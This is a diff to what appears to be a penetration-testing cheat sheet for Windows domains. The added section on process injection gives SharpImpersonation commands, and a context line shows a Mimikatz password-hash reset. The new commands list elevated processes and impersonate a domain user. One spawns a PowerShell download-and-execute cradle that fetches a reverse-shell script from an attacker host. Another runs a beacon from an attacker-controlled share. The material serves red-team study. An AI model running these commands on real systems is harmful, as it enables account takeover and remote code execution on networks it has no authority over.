@@ -167,3 +167,21 @@ Invoke-Mimikatz -Command '"lsadump::setntlm /server:dc01 /user:jeff /ntlm:<NTLM>
 ```
 
 * [https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/](https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/)
+
+# Process Injection
+
+We can also inject our shellcode or our binary to a process running by a user. Notice that **elevated privileges are needed**.
+
+* [https://github.com/S3cur3Th1sSh1t/SharpImpersonation](https://github.com/S3cur3Th1sSh1t/SharpImpersonation)
+
+Get a list of running processes:
+```
+.\SharpImpersonation.exe list elevated
+```
+
+Inject on a process which is run by a specific user:
+```
+.\SharpImpersonation.exe user:CORP\jwick binary:"powershell.exe"
+.\SharpImpersonation.exe user:CORP\jwick binary:"powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://ipkali/rev.ps1')"
+.\SharpImpersonation.exe user:CORP\jwick binary:"\\evil.corp.local\share\beacon.exe"
+```
